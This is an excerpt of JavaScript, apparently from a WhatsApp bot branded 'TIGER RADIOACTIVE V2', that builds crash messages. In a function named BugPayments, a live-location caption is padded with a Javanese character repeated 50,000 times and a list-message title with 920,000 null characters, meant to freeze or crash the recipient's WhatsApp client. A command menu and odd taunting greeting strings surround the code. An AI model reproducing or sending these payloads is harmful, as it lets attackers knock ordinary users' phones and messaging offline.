...
ucapanWaktu = "YOU ARE ALWAYS WEAK😤"
} else if (time >= "15:00:00" && time < "19:00:00") {
ucapanWaktu = "I NEVER FORCE ANYONE TO CHOOSE ME"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "IF YOU THINK YOU CAN FIND BETTER ONE THEN GO AHEAD"
} else if (time >= "06:00:00" && time < "11:00:00") {
ucapanWaktu = "..IM NOT HOLDING YOU BACK"
} else {
ucapanWaktu = "I BELIEVE IN FREEDOM AND THE TRUTH OF FEELINGS"
}
                ...
                'viewOnceMessage': {
                    'message': {
                        'liveLocationMessage': {
                            'degreesLatitude': 'p',
                            'degreesLongitude': 'p',
                            'caption': "𝚻𝚰𝐆𝚵𝚪 𝐑𝚫𝐃𝚰𝚯𝚫𝐂𝚻𝚰𝛁𝚵 𝛁2" + 'ꦾ'.repeat(50000),
                                                        'sequenceNumber': '0',
                                                        'jpegThumbnail': ''
                                                    }
                    }
...
async function BugPayments(jid) {
            ...
            var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
                'listMessage': {
                    'title': "𝚻𝚰𝐆𝚵𝚪 𝐑𝚫𝐃𝚰𝚯𝚫𝐂𝚻𝚰𝛁𝚵 𝛁2" + "\0".repeat(920000),
                                        'footerText': "🦄 Jinx",
                                        'description': "🦄 Jinx",
                    'buttonText': null,
                    'listType': 0x2,
...
let nesy = ` 
 ...
 ┃ ✰ 𝐥𝐢𝐬𝐭𝐛𝐥𝐨𝐜𝐤
 ┗━━━━━━━━━━━━━━━━━◈
> 𝚻𝚰𝐆𝚵𝚪 𝐑𝚫𝐃𝚰𝚯𝚫𝐂𝚻𝚰𝛁𝚵 𝛁2 𝐰𝐚𝐬 𝐢𝐧𝐯𝐞𝐧𝐭𝐞𝐝 ® 2024 
> 𝐁𝐘 𝚻𝚮𝚵𝚵𝐃𝚪𝚫𝐆𝚯𝚴`
sam.sendMessage(m.chat, { 
	           text: nesy,
                    contextInfo: {
